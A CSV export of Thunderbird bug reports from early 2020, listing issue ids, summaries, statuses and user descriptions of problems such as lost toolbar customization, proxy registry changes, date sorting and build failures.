Issue id,Summary,Status,Priority,Resolution,Description
1613965,73.0b1 install removes all toolbar customization,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Installed 73.0b1 Toolbar reverted to default. (no reply, forward, etc.; all toolbar with text + icon) Actual results: Toolbar reverted to default. Expected results: Toolbar retain customization."
1614007,"autoconfig fails, gmail auth prompt not given for username with ""@gmail.com""",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: https://youtu.be/1q1caT4Hfss"
1614020,Downloaded message counter higher than total count,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: Not sure exactly what triggered the issue. The only notable thing I did was trying to search for a mail that contained a specific phrase and and I tried doing so in Sent and then All Mail folders. Messages were being downloaded via ProtonMail Bridge https://protonmail.com/bridge/thunderbird The about window showed version 68.1.x (don't remember the x). Since then it has been updates to 68.4.2. Confusingly there are higher versions listed in the bug version dropdown field. Actual results: Thunderbird was downloading messages. Eventually I noticed that counter on the bottom bar has passed the count of total messages. Expected results: The counter of downloaded messages should not have increased over total count of messages."
1614031,"Intermittent comm/mail/components/preferences/test/browser/browser_cloudfile.js | can't access property ""addSelectionListener"", this.contentWindow.getSelection(...) is null at enableMagicCopy@chrome://chat/content/conversation-browser.js:339:12",RESOLVED,P5,FIXED,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287961220&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Gf-G5qBTQfef4QplcdT_9w/runs/0/artifacts/public/logs/live_backing.log ---
1614111,Messing with Windows Proxy settings,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: It's enough to have Thunderbird open and just wait an issue to happen. Environment: Thunderbird proxy connection settings are ""Use system proxy settings"". Using ordinary ethernet connection - no VPN is conencted! Windows 10 v1909 Actual results: Thunderbird.exe changes the proxy settings in the windows registry. After all system proxy settings based applications lose Internet acces (e.g. Chrome, Slack..). Extract from Process Monitor: 07:48:25,4667323 thunderbird.exe 12468 RegQueryKey HKCU SUCCESS Query: HandleTags, HandleTags: 0x0 07:48:25,4667467 thunderbird.exe 12468 RegOpenKey HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings SUCCESS Desired Access: Read 07:48:25,4667610 thunderbird.exe 12468 RegQueryValue HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable SUCCESS Type: REG_DWORD, Length: 4, Data: 0 07:48:25,4667783 thunderbird.exe 12468 RegQueryValue HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer NAME NOT FOUND Length: 144 07:48:25,4667913 thunderbird.exe 12468 R"
1614128,A lot of emails I am sending out seem to be ending up in clients spam folders for no reason.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: A lot of emails I am sending are going into spam folder to the person I am sending. For no reason. Even if they have sent me email first. Actual results: Tried several times re writing and re sending email and still same result Expected results: Email arrived at inbox and not persons spam folder."
1614131,Mails with timezone in the future will display false date even in received-column,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Steps to reproduce: Recieved a Mail with a timezone way in the future >+9999 Actual results: It displays it's date wrongly in the ""Recieved""-Column (and ""Date""-Column). (see screenshot) The ""Received""-Date in the Header of the Mail has the correct date (Sat, 08 Feb 2020 etc.) but Thunderbird still shows the wrong date in the received-Column. This is different to Bug 1609661 and 194585. Expected results: The received-Column should display the correct time the mail was received."
1614132,Thunderbird 68.4.X reports Lightning and other compatible extensions are not compatible,RESOLVED,--,INVALID,"Thunderbird 68.4.1 and 68.4.2 (64-bit) both report the bundled Lightning is incompatible with Thunderbird even though it's working. It also reports all other extensions are incompatible even though they are also working. I tried uninstalling and reset on extensions.installedDistroAddon.{e2fda1a4-762b-4020-b5ad-a41df1933103}, which fixed the issue for the first restart, but after closing and re-opening it's back to being incompatible. Tried uninstalling Provider for Google Calendar and re-installing from Thunderbird UI and after restart it also reports as incompatible."
1614140,Unable to close open tabs from left to right,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Open multiple mails, so that you have at least two open tabs. Try closing the tabs from left to right, presumably closing the tabs with increasing index number. Actual results: You can only close the first tab. Clicking the X on the second tab does not do anything. Expected results: Every tab should close when clicking on X regardless of it's position/index/sequence they are being closed."
1614145,"Thunderbird no attachment being sent. ""Warning! You are about to send a message of size 94.1 MB. Are you sure you want to do this?",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Thunderbird rev. 68.4.2 (32bit). Send an email. Actual results: Email sent. No file was attached. Warning! You are about to send a message of size 94.1 MB. Are you sure you want to do this? is displayed in a box. I clicked OK. Then ""The size of the message you are trying to send exceeds the global size limit of the server. The message was not sent; reduce the message size and try again. The server responded: 552 5.3.4 Message size exceeds fixed maximum message size.""is displayed in a box. The email is sent. Expected results: Email sent without those messages."
1614150,Numbered bullets have incorrect ordering when nested,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. open compose message window 2. start ordered numbered list with the toolbar button 3. typed out nested ordered number list in message Actual results: Got the following: ``` 1. this 1. is 2. not 3. two?? ``` Expected results: Instead of: ``` 1. this 1. should 2. be 2. two ```
1614159,"column sorts collapse thread in ""open message in conversation""",NEW,--,,"1. use open message in conversation, for thread with >1 message - notice the thread is expanded (and is expanded, regardless of the state when you did ""open"") 2. click to sort any heading result: the thread collapses 3. expand the thread 4. click to sort any heading result: the thread collapses I see this with v68 and beta. Did not attempt to determine if it is a v68 regression. But I'm guessing it is."
1614194,"Preferences tab, when left open, gear wheel favicon after restart not shown",RESOLVED,--,FIXED,STR: - open the preferences and leave open - restart TB Result: The preferences tab shows only a doc icon and no more the gear wheel icon. I tried a build from https://treeherder.mozilla.org/#/jobs?repo=comm-central&revision=a0dda319d59ba06c195aed2a30ef46eee5d8045e and the icon is still correct. With a build from https://treeherder.mozilla.org/#/jobs?repo=comm-central&revision=eb963eb6aec6e17056942021338e08cfb756ffe2 the icon is wrong after a restart. There could be also bug 1613045 in the same check-in but I think this changes are unlikely the culprit.
1614203,Date column sorting symbol bug is not correct initially.,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.131 Safari/537.36 Steps to reproduce: 1. Add a new account 2. Observe default date sorting symbol (^/v) inside folders Actual results: The sorting symbol (arrows ^ or v) is not correct initially. By default, arrow ^ is dispayed but emails are sorted date ascending so it doesn't correspond to the symbol. If you mouse-over the sorting symbol, arrow is automatically reversed and becomes v by itself so it's good now (emails sorting is not modified and are still date ascending). All's well that ends well but if you do nothing you don't have the correct sorting symbol. You need to mouse-over it to make it match the actual sorting. Expected results: Arrow should be v by default, not ^ which doesn't correspond to the initial date ascending sorting."
1614215,preload pinning Key pinning for imap.gmail.com and smtp.gmail.com (HPKP),UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried to figure out if Thunderbird enforces certificate pinning smtp.gmail.com and imap.gmail.com. Actual results: Not able to find information Expected results: Both smtp.gmail.com and imap.gmail.com should be pinned to the correct (Google) certificate authority, and this should be documented."
1614235,View source: fix line wrapping option,RESOLVED,--,FIXED,"The view source window respects `view_source.wrap_long_lines`, but the UI for it has been broken and hidden for some time."
1614240,Artifact builds broken: language pack not building,RESOLVED,--,FIXED,"Since the big calendar changes, artifact builds on the Try server have started failing at the `mach package` step. I've figured out this is because of the language pack creation, which we don't need to do. This part has apparently never worked as intended, and *something* in calendar was causing it to succeed enough not to break the build."
